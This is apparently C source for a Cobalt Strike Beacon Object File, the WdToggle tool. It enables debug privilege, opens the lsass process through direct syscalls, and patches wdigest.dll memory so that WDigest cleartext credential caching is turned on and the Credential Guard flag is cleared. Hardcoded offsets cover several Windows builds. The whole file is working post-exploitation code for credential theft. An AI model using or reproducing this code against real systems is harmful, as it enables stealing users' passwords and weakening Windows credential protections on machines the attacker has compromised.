#include <windows.h>
#include <stdio.h>

#include "WdToggle.h"
#include "Syscalls.h"
#include "beacon.h"

#define MAX_VERSION 32

INT iGarbage = 1;
LPSTREAM lpStream = (LPSTREAM)1;

HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_OK;
	va_list argList;
	WCHAR chBuffer[1024];
	DWORD dwWritten = 0;

	if (lpStream <= (LPSTREAM)1) {
		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	va_start(argList, lpwFormat);
	MSVCRT$memset(chBuffer, 0, sizeof(chBuffer));
	if (!MSVCRT$_vsnwprintf_s(chBuffer, _countof(chBuffer), _TRUNCATE, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}
	
	if (FAILED(hr = lpStream->lpVtbl->Write(lpStream, chBuffer, (ULONG)MSVCRT$wcslen(chBuffer) * sizeof(WCHAR), &dwWritten))) {
		goto CleanUp;
	}

CleanUp:

	va_end(argList);
	
	return hr;
}

VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(lpStream->lpVtbl->Stat(lpStream, &ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(lpStream->lpVtbl->Seek(lpStream, pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
	}

CleanUp:

	if (lpStream != NULL) {
		lpStream->lpVtbl->Release(lpStream);
		lpStream = NULL;
	}

	if (lpwOutput != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
	}

	return;
}

// Open a handle to the LSASS process
HANDLE GrabLsassHandle(DWORD dwPid) {
	NTSTATUS status;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
	uPid.UniqueThread = (HANDLE)0;

	status = ZwOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		return NULL;
	}

	return hProcess;
}

// Read memory from LSASS process
SIZE_T ReadFromLsass(HANDLE hLsass, LPVOID pAddr, LPVOID pMemOut, SIZE_T memOutLen) {
	NTSTATUS status = 0;
	SIZE_T bytesRead = 0;

	MSVCRT$memset(pMemOut, 0, memOutLen);

	status = ZwReadVirtualMemory(hLsass, pAddr, pMemOut, memOutLen, &bytesRead);
	if (status != STATUS_SUCCESS) {
		return 0;
	}

	return bytesRead;
}

// Write memory to LSASS process
SIZE_T WriteToLsass(HANDLE hLsass, LPVOID pAddr, LPVOID memIn, SIZE_T memInLen) {
	NTSTATUS status = 0;
	SIZE_T bytesWritten = 0;

	status = ZwWriteVirtualMemory(hLsass, pAddr, memIn, memInLen, &bytesWritten);
	if (status != STATUS_SUCCESS) {
		return 0;
	}

	return bytesWritten;
}

BOOL ToggleWDigest(HANDLE hLsass, LPSTR scWdigestMem, DWORD64 logonCredential_offSet, BOOL bCredGuardEnabled, DWORD64 credGuardEnabled_offset) {
	ULONG ulNewLogonValue = 1, ulNewCredGuardValue = 0;
	ULONG ulCurLogonValue, ulCurCredGuardValue;
	SIZE_T sResult = 0;

	LPVOID pAddrOfUseLogonCredentialGlobalVariable = (PUCHAR)scWdigestMem + logonCredential_offSet;
	LPVOID pAddrOfIsCredGuardEnabledGlobalVariable = (PUCHAR)scWdigestMem + credGuardEnabled_offset;

	BeaconPrintToStreamW(L"[+] g_fParameter_UseLogonCredential at 0x%p\n", pAddrOfUseLogonCredentialGlobalVariable);
	if (bCredGuardEnabled) {
		BeaconPrintToStreamW(L"[+] g_IsCredGuardEnabled at 0x%p\n", pAddrOfIsCredGuardEnabledGlobalVariable);
	}

	// Read current value of wdigest!g_fParameter_useLogonCredential
	sResult = ReadFromLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulCurLogonValue, sizeof(ULONG));
	if (sResult == 0) {
		return FALSE;
	}

	if (ulCurLogonValue == 1) {
		BeaconPrintToStreamW(L"\n[!] UseLogonCredential already enabled\n\n");
		return TRUE;
	}
	else if (ulCurLogonValue != 0) {
		BeaconPrintToStreamW(L"[!] Error: Unexpected g_fParameter_UseLogonCredential value (possible offset mismatch?)\n\n");
		return FALSE;
	}
	else {
		BeaconPrintToStreamW(L"[+] Current value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);	
		BeaconPrintToStreamW(L"[+] Toggling g_fParameter_UseLogonCredential to 1 in lsass.exe\n");
	}

	sResult = WriteToLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulNewLogonValue, sizeof(ULONG));
	if (sResult == 0) {
		return FALSE;
	}

	// Read new value of wdigest!g_fParameter_useLogonCredential
	ReadFromLsass(hLsass, pAddrOfUseLogonCredentialGlobalVariable, &ulCurLogonValue, sizeof(ULONG));
	BeaconPrintToStreamW(L"[+] New value of g_fParameter_UseLogonCredential is: %d\n", ulCurLogonValue);

	if (bCredGuardEnabled && credGuardEnabled_offset != 0) {
		// Read current value of wdigest!g_IsCredGuardEnabled
		sResult = ReadFromLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulCurCredGuardValue, sizeof(ULONG));
		if (sResult == 0) {
			return FALSE;
		}

		if (ulCurCredGuardValue == 0) {
			BeaconPrintToStreamW(L"[+] IsCredGuardEnabled already disabled\n\n");
			return TRUE;
		}
		else if (ulCurCredGuardValue != 1) {
			BeaconPrintToStreamW(L"[!] Error: Unexpected g_IsCredGuardEnabled value (possible offset mismatch?)\n\n");
			return FALSE;
		}
		else {
			BeaconPrintToStreamW(L"[+] Current value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);	
			BeaconPrintToStreamW(L"[+] Toggling g_IsCredGuardEnabled to 0 in lsass.exe\n");
		}

		sResult = WriteToLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulNewCredGuardValue, sizeof(ULONG));
		if (sResult == 0) {
			return FALSE;
		}

		// Read new value of wdigest!g_IsCredGuardEnabled
		ReadFromLsass(hLsass, pAddrOfIsCredGuardEnabledGlobalVariable, &ulCurCredGuardValue, sizeof(ULONG));
		BeaconPrintToStreamW(L"[+] New value of g_IsCredGuardEnabled is: %d\n", ulCurCredGuardValue);
	}

	BeaconPrintToStreamW(L"\n[+] Done... WDigest credential caching should now be on\n\n");

	return TRUE;
}

BOOL EnumFileVersion(_In_ LPWSTR lpwFileVer) {
	BOOL bResult = FALSE;
	PBYTE lpVerInfo = NULL;
	LPWSTR lpwFileVersion = NULL;
	LPCWSTR lpwFilePath = L"C:\\Windows\\System32\\wdigest.dll";
	DWORD dwHandle = 0;

	DWORD dwLen = VERSION$GetFileVersionInfoSizeW(lpwFilePath, &dwHandle);
	if (!dwLen) {
		goto CleanUp;
	}

	lpVerInfo = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, dwLen);
	if (lpVerInfo == NULL) {
		goto CleanUp;
	}

	if (!VERSION$GetFileVersionInfoW(lpwFilePath, 0L, dwLen, lpVerInfo)) {
		goto CleanUp;
	}

	struct LANGANDCODEPAGE {
		WORD wLanguage;
		WORD wCodePage;
	} *lpTranslate;

	WCHAR wcCodePage[MAX_PATH];
	MSVCRT$memset(&wcCodePage, 0, sizeof(wcCodePage));
	WCHAR wcProductVersion[MAX_PATH];
	MSVCRT$memset(&wcProductVersion, 0, sizeof(wcProductVersion));

	UINT uLen;
	if (VERSION$VerQueryValueW(lpVerInfo, L"\\VarFileInfo\\Translation", (void **)&lpTranslate, &uLen)) {
		MSVCRT$swprintf_s(wcCodePage, _countof(wcCodePage), L"%04x%04x", lpTranslate->wLanguage, lpTranslate->wCodePage);

		MSVCRT$wcscat_s(wcProductVersion, _countof(wcProductVersion), L"\\StringFileInfo\\");
		MSVCRT$wcscat_s(wcProductVersion, _countof(wcProductVersion), wcCodePage);
		MSVCRT$wcscat_s(wcProductVersion, _countof(wcProductVersion), L"\\ProductVersion");

		if (VERSION$VerQueryValueW(lpVerInfo, wcProductVersion, (void **)&lpwFileVersion, &uLen) != 0) {
			MSVCRT$wcscpy_s(lpwFileVer, MAX_VERSION, lpwFileVersion);
			bResult = TRUE;
		}
	}

CleanUp:

	if (lpVerInfo != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpVerInfo);
	}

	return bResult;
}

HANDLE OpenRegKeyHandle(INT DesiredAccess, PUNICODE_STRING RegistryKeyName) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE regKeyHandle = NULL;

	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, RegistryKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = ZwOpenKey(&regKeyHandle, DesiredAccess, &ObjectAttributes);
	if (Status != STATUS_SUCCESS) {
		return NULL;
	}

	return regKeyHandle;
}

// Read UBR (Update Build Revision) from registry
DWORD ReadUBRFromRegistry() {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE regKeyHandle = NULL;
	UNICODE_STRING RegistryKeyName;	
	UNICODE_STRING KeyValueName;
	PKEY_VALUE_FULL_INFORMATION KeyValueInformation = NULL;
	ULONG KeyResultLength = 0;
	DWORD dwValueData = 0;

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return 0;
	}

	RtlInitUnicodeString(&RegistryKeyName, L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion");
	RtlInitUnicodeString(&KeyValueName, L"UBR");

	regKeyHandle = OpenRegKeyHandle(KEY_QUERY_VALUE, &RegistryKeyName);
	if (regKeyHandle == NULL) {
		return 0;
	}

	Status = ZwQueryValueKey(regKeyHandle, &KeyValueName, KeyValueFullInformation, NULL, 0, &KeyResultLength);
	if (Status != STATUS_BUFFER_TOO_SMALL) {
		goto CleanUp;
	}

	KeyValueInformation = (PKEY_VALUE_FULL_INFORMATION)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, KeyResultLength);
	Status = ZwQueryValueKey(regKeyHandle, &KeyValueName, KeyValueFullInformation, KeyValueInformation, KeyResultLength, &KeyResultLength);
	if (Status != STATUS_SUCCESS) {
		goto CleanUp;
	}

	dwValueData = *((DWORD*)((PUCHAR)&KeyValueInformation[0] + KeyValueInformation[0].DataOffset));

CleanUp:

	if (regKeyHandle != NULL) {
		ZwClose(regKeyHandle);
	}

	if (KeyValueInformation != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, KeyValueInformation);
	}

	return dwValueData;
}

// Searches for lsass.exe PID
DWORD GetLsassPid(LPCWSTR lpwLsass) {
	NTSTATUS status;
	LPVOID pBuffer = NULL;
	DWORD dwPid = 0;
	ULONG uReturnLength = 0;
	SIZE_T uSize = 0;
	PSYSTEM_PROCESSES pProcInfo = NULL;

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return 0;
	}

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlEqualUnicodeString");
	if (RtlEqualUnicodeString == NULL) {
		return 0;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!(status == STATUS_INFO_LENGTH_MISMATCH)) {
		return 0;
	}

	uSize = uReturnLength;
	status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return 0;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != STATUS_SUCCESS) {
		status = ZwFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
		return 0;
	}

	UNICODE_STRING uLsass;
	RtlInitUnicodeString(&uLsass, lpwLsass);

	pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &uLsass, TRUE)) {
			dwPid = (DWORD)(DWORD_PTR)pProcInfo->ProcessId;
			goto CleanUp;
		}

		if (pProcInfo->NextEntryDelta == 0) {
			break;
		}

	} while (pProcInfo && pProcInfo->NextEntryDelta);

CleanUp:

	if (pBuffer != NULL) {
		ZwFreeVirtualMemory(NtCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
	}

	return dwPid;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	_NtOpenProcessToken NtOpenProcessToken = (_NtOpenProcessToken)
		GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
	if (NtOpenProcessToken == NULL) {
		return FALSE;
	}

	NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	LPCWSTR lpwPriv = L"SeDebugPrivilege";
	if (!ADVAPI32$LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		ZwClose(hToken);
		return FALSE;
	}

	status = ZwAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (status != STATUS_SUCCESS) {
		ZwClose(hToken);
		return FALSE;
	}

	ZwClose(hToken);

	return TRUE;
}


VOID go(IN PCHAR Args, IN ULONG Length) {
	HANDLE hLsass = NULL;
	HMODULE* hLsassDll = NULL;
	DWORD bytesReturned;
	DWORD cbNeeded;
	CHAR modName[MAX_PATH];
	LPSTR wdigest = NULL;
	BOOL bCredGuardEnabled = FALSE;
	DWORD64 logonCredential_offSet = 0;
	DWORD64 credGuardEnabled_offset = 0;
	DWORD dwResult = 0;

	WCHAR chOSMajorMinor[8];
	DWORD dwUBR = 0;
	WCHAR wcFileVersion[MAX_VERSION];
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;
	DWORD dwLsassPID = 0;
	DWORD dwLsaIsoPID = 0;


	pTIB = (PNT_TIB)GetTEBAsm64();

	pTEB = (PTEB)pTIB->Self;
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL) {
		return;
	}

	MSVCRT$swprintf_s(chOSMajorMinor, sizeof(chOSMajorMinor), L"%u.%u", pPEB->OSMajorVersion, pPEB->OSMinorVersion);
	
	// Read UBR value from registry (we don't want to screw up lsass)
	dwUBR = ReadUBRFromRegistry();
	if (dwUBR != 0) {
		BeaconPrintToStreamW(L"[+] Windows version: %ls, OS build number: %u.%u\n", chOSMajorMinor, pPEB->OSBuildNumber, dwUBR);
	}
	else {
		BeaconPrintToStreamW(L"[+] Windows version: %ls, OS build number: %u\n", chOSMajorMinor, pPEB->OSBuildNumber);
	}

	MSVCRT$memset(wcFileVersion, 0, sizeof(wcFileVersion));
	if (!EnumFileVersion(wcFileVersion)) {
		BeaconPrintToStreamW(L"[!] Error: Failed to retrieve wdigest file version\n");
		goto CleanUp;
	}
	else{
		BeaconPrintToStreamW(L"[+] Wdigest file version: %ls\n\n", wcFileVersion);
	}

	// Use Winbindex (https://winbindex.m417z.com/?file=wdigest.dll) to download specific wdigest.dll versions.
	// Offsets for wdigest!g_fParameter_UseLogonCredential (here you can add offsets for additional OS builds/file revisions)
	// C:\Program Files (x86)\Windows Kits\10\Debuggers\x64>cdb.exe -z C:\Windows\System32\wdigest.dll
	// 0:000>x wdigest!g_fParameter_UseLogonCredential
	// 0:000>x wdigest!g_IsCredGuardEnabled
	if (MSVCRT$_wcsicmp(chOSMajorMinor, L"6.3") == 0 && pPEB->OSBuildNumber == 9600 && dwUBR >= 19747) { // 8.1 / W2k12 R2
		logonCredential_offSet = 0x33040;
	}
	else if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0) {
		if (MSVCRT$_wcsicmp(wcFileVersion, L"10.0.14393.3808") == 0) { // v1607 / Server 2016
			logonCredential_offSet = 0x35dc0;
			credGuardEnabled_offset = 0x35ba8;
		}
		else if (MSVCRT$_wcsicmp(wcFileVersion, L"10.0.17763.4131") == 0) { // v1809 / Server 2019
			logonCredential_offSet = 0x38234;
			credGuardEnabled_offset = 0x37c08;
		}
		else if (MSVCRT$_wcsicmp(wcFileVersion, L"10.0.19041.2673") == 0) { // Windows 10 >= 20H2
			logonCredential_offSet = 0x392b4;
			credGuardEnabled_offset = 0x38c88;
		}
		else if (MSVCRT$_wcsicmp(wcFileVersion, L"10.0.20348.1547") == 0) { // W2k22
			logonCredential_offSet = 0x3dbbc;
			credGuardEnabled_offset = 0x3dbc8;
		}
		else if (MSVCRT$_wcsicmp(wcFileVersion, L"10.0.22000.1641") == 0) { // W11 v21H2
			logonCredential_offSet = 0x3dbbc;
			credGuardEnabled_offset = 0x3dbc8;
		}
		else if (MSVCRT$_wcsicmp(wcFileVersion, L"10.0.22621.1") == 0) { // W11 v22H2
			logonCredential_offSet = 0x3ec0c;
			credGuardEnabled_offset = 0x3ec18;
		}
		else {
			BeaconPrintToStreamW(L"[!] Wdigest.dll file version not supported, see the readme file on how to add offset values manually\n");
			goto CleanUp;
		}
	}
	else {
		BeaconPrintToStreamW(L"[!] OS Version/build not supported, see the readme file on how to add offset values manually\n");
		goto CleanUp;
	}

	BeaconPrintToStreamW(L"[+] Enable SeDebugPrivilege\n");
	if (!SetDebugPrivilege()) {
		BeaconPrintToStreamW(L"[!] Error: Failed to enable SeDebugPrivilege\n");
		goto CleanUp;
	}

	dwLsassPID = GetLsassPid(L"lsass.exe");
	if (dwLsassPID != 0) {
		BeaconPrintToStreamW(L"[+] Lsass PID is: %u\n", dwLsassPID);
	}
	else{
		BeaconPrintToStreamW(L"[!] Error: Failed to obtain to lsass PID\n");
		goto CleanUp;
	}

	if (MSVCRT$_wcsicmp(chOSMajorMinor, L"10.0") == 0 && pPEB->OSBuildNumber >= 14393) {
		dwLsaIsoPID = GetLsassPid(L"lsaiso.exe");
		if (dwLsaIsoPID != 0) {
			bCredGuardEnabled = TRUE;
			BeaconPrintToStreamW(L"[+] Credential Guard enabled, LsaIso PID is: %u\n", dwLsaIsoPID);
		}
	}

	hLsass = GrabLsassHandle(dwLsassPID);
	if (hLsass ==  NULL || hLsass == INVALID_HANDLE_VALUE) {
		BeaconPrintToStreamW(L"[!] Error: Could not open handle to lsass process\n");
		goto CleanUp;
	}

	if(!PSAPI$EnumProcessModules(hLsass, 0, 0, &cbNeeded)){
		BeaconPrintToStreamW(L"[!] Error: Failed to enumerate modules\n");
		goto CleanUp;
	}

	hLsassDll = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbNeeded);
	if (hLsassDll == NULL) {
		BeaconPrintToStreamW(L"[!] Error: Failed to allocate modules memory\n");
		goto CleanUp;
	}

	// Enumerate all loaded modules within lsass process
	if (PSAPI$EnumProcessModules(hLsass, hLsassDll, cbNeeded, &bytesReturned)) {
		for (int i = 0; i < bytesReturned / sizeof(HMODULE); i++) {
			PSAPI$GetModuleFileNameExA(hLsass, hLsassDll[i], modName, sizeof(modName));
			if (MSVCRT$strstr(modName, "wdigest.DLL") != (LPSTR)NULL) {
				wdigest = (LPSTR)hLsassDll[i];
				break;
			}
		}
	}
	else {
		BeaconPrintToStreamW(L"[!] Error: No modules in LSASS :(\n");
		BeaconPrintToStreamW(L"[!] Error: %d\n", KERNEL32$GetLastError());
		goto CleanUp;
	}

	// Make sure we have all the DLLs that we require
	if (wdigest == NULL) {
		BeaconPrintToStreamW(L"[!] Error: Could not find all DLL's in LSASS :(\n");
		goto CleanUp;
	}

	BeaconPrintToStreamW(L"[+] wdigest.dll found at 0x%p\n\n", wdigest);

	if (!ToggleWDigest(hLsass, wdigest, logonCredential_offSet, bCredGuardEnabled, credGuardEnabled_offset)) {
		BeaconPrintToStreamW(L"[!] Error: Could not patch g_fParameter_UseLogonCredential\n");
		goto CleanUp;
	}

CleanUp:

	//Print final Output
	BeaconOutputStreamW();

	if (hLsass != NULL) {
		ZwClose(hLsass);
	}

	if (hLsassDll != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, hLsassDll);
	}

	return;
}
